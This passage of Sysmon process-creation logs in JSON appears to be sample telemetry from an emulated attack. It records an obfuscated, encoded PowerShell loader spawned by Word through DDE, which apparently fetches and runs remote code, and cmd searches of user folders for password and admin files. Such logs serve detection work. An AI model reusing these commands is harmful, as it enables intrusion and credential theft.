AAMQAxADMALAA0ADUAIAAsACAAMQAxADIAIAAsACAAMQAxADQALAAxADEAMQAsADEAMAAwACAALAAxADEANwAgACwAOQA5ACwAIAAxADEANgAgACwAMQAwADUALAAxADEAMQAsACAAMQAxADAALAAxADEANQAgACwANAA2ACwAOQA5ACwAIAAxADEAMQAgACwAIAAxADAAOQAsADQANwAgACwAIAAxADAANgAsADEAMAA3ACwAOAA4ACAALAAgADcAMgAsADgAMwAsADcANQAsACAAOAAzACAALAA3ADEALAAxADAANgAsACAANAA3ACAALAAgADQANAAsACAAMQAwADQAIAAsACAAMQAxADYAIAAsACAAMQAxADYAIAAsADEAMQAyACAALAA1ADgAIAAsADQANwAgACwAIAA0ADcAIAAsADEAMQA2ACwAMQAxADEAIAAsACAAMQAxADEALAAxADAAOAAsADEAMAAzACwAMQAwADEAIAAsACAAMQAwADEAIAAsACAAMQAwADcAIAAsADEAMAAxACwAIAAxADEANAAsADQANgAsADkAOQAgACwAMQAxADEALAAxADAAOQAgACwAIAA0ADcAIAAsADEAMgAxACwAIAA4ADEALAAgADQANwAsACAANAA0ACwAIAAxADAANAAgACwAMQAxADYALAAxADEANgAsADEAMQAyACwANQA4ACAALAA0ADcAIAAsADQANwAgACwAMQAxADEALAAgADEAMQAyACAALAA5ADcALAAxADEANAAgACwAIAA5ADcALAAgADQANgAgACwAIAA5ADkAIAAsACAAMQAxADEAIAAsACAANAA2ACAALAAxADIAMgAsADkANwAgACwANAA3ACAALAAxADAANAAgACwAMQAwADgALAA5ADAALAA4ADcALAAxADEAMgAsACAAMQAxADkAIAAsACAAOAA5ACAALAAgADcAMAAsACAAOAAyACAALAA0ADcAIAAsACAANAA0ACwAIAAxADAANAAsACAAMQAxADYAIAAsACAAMQAxADYAIAAsACAAMQAxADIALAA1ADgAIAAsACAANAA3ACwANAA3ACAALAAgADEAMAAzACwAMQAxADEALAAxADEAMQAgACwAMQAwADAAIAAsACAAMQAwADkAIAAsADkANwAsADEAMQAwACwAIAAxADEANQAsACAAOQA4ACwAOQA4ACwAIAAxADEAMwAgACwAIAA0ADYALAA5ADkALAAxADEAMQAsACAAMQAwADkALAA0ADcAIAAsADEAMQAzACAALAAgADEAMAA4ACAALAAgADEAMAA1ACAALAAgADEAMAA1ACwAIAA3ADUALAAgADgANQAsADgAMgAsACAAMQAwADUALAAgADQANwAsACAAMwA5ACwANAA2ACwAOAAzACAALAAxADEAMgAgACwAIAAxADAAOAAgACwAMQAwADUALAAxADEANgAsADQAMAAgACwAMwA5ACwANAA0ACAALAAgADMAOQAsADQAMQAsACAANQA5ACwAIAAzADYALAAgADEAMQAwACAALAA5ADcAIAAsACAAMQAwADkAIAAsACAAMQAwADEALAAgADMAMgAgACwAIAA2ADEAIAAsADMAMgAsACAAMwA2ACAALAAgADEAMQA0ACwAOQA3ACwAIAAxADEAMAAsADEAMAAwACAALAAgADEAMQAxACwAIAAxADAAOQAsADQANgAsADEAMQAwACAALAAxADAAMQAsACAAMQAyADAAIAAsACAAMQAxADYAIAAsACAANAAwACAALAA0ADkAIAAsACAANAA0ACAALAAgADMAMgAsACAANQA0ACwAIAA1ADMAIAAsADUAMwAsADUAMQAgACwAIAA1ADQAIAAsACAANAAxACwAIAA1ADkALAAgADMANgAgACwAIAAxADEAMgAgACwAIAA5ADcALAAgADEAMQA2ACwAMQAwADQALAAzADIAIAAsADYAMQAsACAAMwAyACwAMwA2ACAALAAgADEAMAAxACwAIAAxADEAMAAgACwAMQAxADgAIAAsADUAOAAsACAAMQAxADYAIAAsACAAMQAwADEAIAAsACAAMQAwADkALAAgADEAMQAyACAALAAzADIALAA0ADMAIAAsADMAMgAgACwAIAAzADkAIAAsADkAMgAsACAAMwA5ACAALAAgADMAMgAgACwAIAA0ADMAIAAsACAAMwAyACwAIAAzADYAIAAsACAAMQAxADAALAAgADkANwAsADEAMAA5ACwAIAAxADAAMQAgACwAIAAzADIAIAAsACAANAAzACAALAAzADIAIAAsACAAMwA5ACAALAAgADQANgAgACwAIAAxADAAMQAsADEAMgAwACAALAAgADEAMAAxACAALAAgADMAOQAgACwANQA5ACwAMQAwADIALAAgADEAMQAxACAALAAgADEAMQA0ACAALAAxADAAMQAsACAAOQA3ACAALAAgADkAOQAsADEAMAA0ACAALAA0ADAAIAAsADMANgAsACAAMQAxADcALAAgADEAMQA0ACwAIAAxADAAOAAsADMAMgAsACAAMQAwADUALAAgADEAMQAwACAALAAgADMAMgAsADMANgAgACwAIAAxADEANwAgACwAIAAxADEANAAgACwAMQAwADgAIAAsACAAMQAxADUAIAAsACAANAAxACAALAAgADEAMgAzACAALAAgADEAMQA2ACAALAAgADEAMQA0ACwAIAAxADIAMQAsADEAMgAzACAALAAgADMANgAgACwAMQAxADkALAAgADEAMAAxACwAOQA4ACwAIAA5ADkALAAxADAAOAAsADEAMAA1ACwAMQAwADEALAAgADEAMQAwACAALAAxADEANgAgACwANAA2ACAALAA2ADgALAAgADEAMQAxACAALAAgADEAMQA5ACAALAAxADEAMAAgACwAMQAwADgALAAxADEAMQAgACwAIAA5ADcALAAgADEAMAAwACwAIAA3ADAAIAAsACAAMQAwADUAIAAsADEAMAA4ACAALAAgADEAMAAxACwANAAwACAALAAgADMANgAgACwAIAAxADEANwAsADEAMQA0ACwAIAAxADAAOAAgACwAIAA0ADYAIAAsADgANAAgACwAMQAxADEALAA4ADMAIAAsACAAMQAxADYALAAxADEANAAgACwAIAAxADAANQAgACwAMQAxADAAIAAsACAAMQAwADMALAA0ADAALAA0ADEAIAAsACAANAA0ACAALAAzADIAIAAsACAAMwA2ACAALAAxADEAMgAsADkANwAsADEAMQA2ACAALAAxADAANAAgACwANAAxACAALAAgADUAOQAsACAAOAAzACwAMQAxADYAIAAsACAAOQA3ACwAMQAxADQAIAAsADEAMQA2ACwAIAA0ADUAIAAsACAAOAAwACAALAAgADEAMQA0ACwAMQAxADEAIAAsADkAOQAgACwAIAAxADAAMQAsACAAMQAxADUAIAAsADEAMQA1ACAALAAgADMAMgAsACAAMwA2ACAALAAxADEAMgAsADkANwAgACwAIAAxADEANgAsACAAMQAwADQAIAAsACAANQA5ACAALAAgADkAOAAsACAAMQAxADQAIAAsACAAMQAwADEAIAAsACAAOQA3ACAALAAxADAANwAsACAANQA5ACAALAAxADIANQAgACwAOQA5ACwAIAA5ADcAIAAsACAAMQAxADYAIAAsADkAOQAsACAAMQAwADQALAAxADIAMwAgACwAIAAxADEAOQAgACwAIAAxADEANAAsADEAMAA1ACAALAAgADEAMQA2ACAALAAxADAAMQAsACAANAA1ACwAIAAxADAANAAgACwAIAAxADEAMQAgACwAMQAxADUAIAAsACAAMQAxADYALAAzADIALAAzADYAIAAsACAAOQA1ACwANAA2ACwANgA5ACwAIAAxADIAMAAgACwAIAA5ADkAIAAsACAAMQAwADEAIAAsACAAMQAxADIAIAAsACAAMQAxADYAIAAsACAAMQAwADUALAAgADEAMQAxACAALAAgADEAMQAwACwANAA2ACwAIAA3ADcAIAAsADEAMAAxACwAIAAxADEANQAgACwAMQAxADUALAA5ADcAIAAsADEAMAAzACAALAAgADEAMAAxACAALAAgADUAOQAgACwAIAAxADIANQAgACwAIAAxADIANQApACAAKwAiACQAKAAgAFMARQBUAC0ASQB0AEUATQAgACAAJwBWAEEAcgBpAGEAQgBMAGUAOgBvAGYAcwAnACAAIAAnACAAJwAgACkAIAAiAHwAIAAmACgAKABnAFYAIAAnACoAbQBEAHIAKgAnACkALgBOAEEAbQBlAFsAMwAsADEAMQAsADIAXQAtAEoATwBpAG4AJwAnACkADQAKAA==",
      "CurrentDirectory": "C:\\Users\\Gen Eric\\Documents\\",
      "Hashes": "SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C",
      "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "Medium",
      "LogonGuid": "49F1AF32-4475-59DB-0000-0020B8040100",
      "LogonId": "0x000104b8",
      "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE\" /n /dde",
      "ParentImage": "C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE",
      "ParentProcessGuid": "49F1AF32-4730-59DB-0000-0010A9950700",
      "ParentProcessId": "2168",
      "ProcessGuid": "49F1AF32-48FD-59DB-0000-00108C980D00",
      "ProcessId": "2180",
      "TerminalSessionId": "1",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "33936",
      "Execution": {
        "ProcessID": "2160",
        "ThreadID": "2380"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "\"cmd\" /c dir \"C:\\Users\\*password*\" /b /s /a-d",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows Command Processor",
      "FileVersion": "6.1.7601.17514 (win7sp1_rtm.101119-1850)",
      "Hashes": "SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8,MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,SHA256=DB06C3534964E3FC79D2763144BA53742D7FA250CA336F4A0FE724B75AAFF386,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "{49F1AF32-356A-5AC7-0000-0020E7030000}",
      "LogonId": "0x3e7",
      "ParentCommandLine": "C:\\commander.exe -f",
      "ParentImage": "C:\\commander.exe",
      "ParentProcessGuid": "{49F1AF32-38A7-5AC7-0000-0010869A0A00}",
      "ParentProcessId": "920",
      "ProcessGuid": "{49F1AF32-38CB-5AC7-0000-00104F090D00}",
      "ProcessId": "956",
      "Product": "Microsoft® Windows® Operating System",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "898286",
      "Execution": {
        "ProcessID": "1456",
        "ThreadID": "1712"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "\"cmd\" /c dir \"C:\\Users\\*admin*\" /b /s /a-d",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows Command Processor",
      "FileVersion": "6.1.7601.17514 (win7sp1_rtm.101119-1850)",
      "Hashes": "SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8,MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,SHA256=DB06C3534964E3FC79D2763144BA53742D7FA250CA336F4A0FE724B75AAFF386,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "{49F1AF32-356A-5AC7-0000-0020E7030000}",
      "LogonId": "0x3e7",
      "ParentCommandLine": "C:\\commander.exe -f",
      "ParentImage": "C:\\commander.exe",
      "ParentProcessGuid": "{49F1AF32-38A7-5AC7-0000-0010869A0A00}",
      "ParentProcessId": "920",
      "ProcessGuid": "{49F1AF32-38CB-5AC7-0000-00106D140D00}",
      "ProcessId": "1004",
      "Product": "Microsoft® Windows® Operating System",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "898333",
      "Execution": {
        "ProcessID": "1456",
        "ThreadID": "1712"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "\"powershell\" -command -",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows PowerShell",
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "{49F1AF32-356A-5AC7-0000-0020E7030000}",
      "LogonId": "0x3e7",
      "ParentCommandLine": "C:\\commander.exe -f",
      "ParentImage": "C:\\commander.exe",
      "ParentProcessGuid": "{49F1AF32-38A7-5AC7-0000-0010869A0A00}",
      "ParentProcessId": "920",
      "ProcessGuid": "{49F1AF32-38E5-5AC7-0000-001062800D00}",
      "ProcessId": "1792",
      "Product": "Microsoft® Windows® Operating System",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "899572",
      "Execution": {
        "ProcessID": "1456",
        "ThreadID": "1712"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "\"powershell\" -command -",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows PowerShell",
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "{49F1AF32-356A-5AC7-0000-0020E7030000}",
      "LogonId": "0x3e7",
      "ParentCommandLine": "C:\\commander.exe -f",
      "ParentImage": "C:\\commander.exe",
      "ParentProcessGuid": "{49F1AF32-38A7-5AC7-0000-0010869A0A00}",
      "ParentProcessId": "920",
      "ProcessGuid": "{49F1AF32-3AD5-5AC7-0000-001036B91300}",
      "ProcessId": "2520",
      "Product": "Microsoft® Windows® Operating System",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "913977",
      "Execution": {
        "ProcessID": "1456",
        "ThreadID": "1712"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "\"powershell\" -command -",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows PowerShell",
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "{49F1AF32-356A-5AC7-0000-0020E7030000}",
      "LogonId": "0x3e7",
      "ParentCommandLine": "C:\\commander.exe -f",
      "ParentImage": "C:\\commander.exe",
      "ParentProcessGuid": "{49F1AF32-38A7-5AC7-0000-0010869A0A00}",
      "ParentProcessId": "920",
      "ProcessGuid": "{49F1AF32-3D63-5AC7-0000-0010C5D92300}",
      "ProcessId": "1664",
      "Product": "Microsoft® Windows® Operating System",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "928837",
      "Execution": {
        "ProcessID": "1456",
        "ThreadID": "1712"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "\"powershell\" -command -",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows PowerShell",
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "{49F1AF32-356A-5AC7-0000-0020E7030000}",
      "LogonId": "0x3e7",
      "ParentCommandLine": "C:\\commander.exe -f",
      "ParentImage": "C:\\commander.exe",
      "ParentProcessGuid": "{49F1AF32-38A7-5AC7-0000-0010869A0A00}",
      "ParentProcessId": "920",
      "ProcessGuid": "{49F1AF32-3D73-5AC7-0000-001015282400}",
      "ProcessId": "2596",
      "Product": "Microsoft® Windows® Operating System",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "929504",
      "Execution": {
        "ProcessID": "1456",
        "ThreadID": "1712"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "\"powershell\" -command -",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows PowerShell",
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "{49F1AF32-356A-5AC7-0000-0020E7030000}",
      "LogonId": "0x3e7",
      "ParentCommandLine": "C:\\commander.exe -f",
      "ParentImage": "C:\\commander.exe",
      "ParentProcessGuid": "{49F1AF32-38A7-5AC7-0000-0010869A0A00}",
      "ParentProcessId": "920",
      "ProcessGuid": "{49F1AF32-3DFC-5AC7-0000-0010D7162500}",
      "ProcessId": "1840",
      "Product": "Microsoft® Windows® Operating System",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "932096",
      "Execution": {
        "ProcessID": "1456",
        "ThreadID": "1712"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "\"powershell\" -command -",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows PowerShell",
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "{49F1AF32-356A-5AC7-0000-0020E7030000}",
      "LogonId": "0x3e7",
      "ParentCommandLine": "C:\\commander.exe -f",
      "ParentImage": "C:\\commander.exe",
      "ParentProcessGuid": "{49F1AF32-38A7-5AC7-0000-0010869A0A00}",
      "ParentProcessId": "920",
      "ProcessGuid": "{49F1AF32-3E0C-5AC7-0000-001022B82500}",
      "ProcessId": "1912",
      "Product": "Microsoft® Windows® Operating System",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "933983",
      "Execution": {
        "ProcessID": "1456",
        "ThreadID": "1712"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "\"powershell\" -command -",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows PowerShell",
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "{49F1AF32-356A-5AC7-0000-0020E7030000}",
      "LogonId": "0x3e7",
      "ParentCommandLine": "C:\\commander.exe -f",
      "ParentImage": "C:\\commander.exe",
      "ParentProcessGuid": "{49F1AF32-38A7-5AC7-0000-0010869A0A00}",
      "ParentProcessId": "920",
      "ProcessGuid": "{49F1AF32-3E97-5AC7-0000-00107D622900}",
      "ProcessId": "1752",
      "Product": "Microsoft® Windows® Operating System",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "939735",
      "Execution": {
        "ProcessID": "1456",
        "ThreadID": "1712"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "\"powershell\" -command -",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows PowerShell",
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "{49F1AF32-356A-5AC7-0000-0020E7030000}",
      "LogonId": "0x3e7",
      "ParentCommandLine": "C:\\commander.exe -f",
      "ParentImage": "C:\\commander.exe",
      "ParentProcessGuid": "{49F1AF32-38A7-5AC7-0000-0010869A0A00}",
      "ParentProcessId": "920",
      "ProcessGuid": "{49F1AF32-3EA9-5AC7-0000-00100AB02900}",
      "ProcessId": "2512",
      "Product": "Microsoft® Windows® Operating System",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "940373",
      "Execution": {
        "ProcessID": "1456",
        "ThreadID": "1712"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "C:\\Windows\\system32\\cmd.exe /c \"sc.exe stop caldera\"",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows Command Processor",
      "FileVersion": "6.3.9600.16384 (winblue_rtm.130821-1623)",
      "Hashes": "SHA1=7C3D7281E1151FE4127923F4B4C3CD36438E1A12,MD5=F5AE03DE0AD60F5B17B82F2CD68402FE,SHA256=6F88FB88FFB0F1D5465C2826E5B4F523598B1B8378377C8378FFEBC171BAD18B,IMPHASH=77AED1ADAF24B344F08C8AD1432908C3",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "{8C352DC7-3282-5AC7-0000-0020E7030000}",
      "LogonId": "0x3e7",
      "ParentCommandLine": "\"C:\\Program Files\\cagent\\cagent.exe\"",
      "ParentImage": "C:\\Program Files\\cagent\\cagent.exe",
      "ParentProcessGuid": "{8C352DC7-329A-5AC7-0000-0010205E0100}",
      "ParentProcessId": "1340",
      "ProcessGuid": "{8C352DC7-3FAC-5AC7-0000-001076B81300}",
      "ProcessId": "2420",
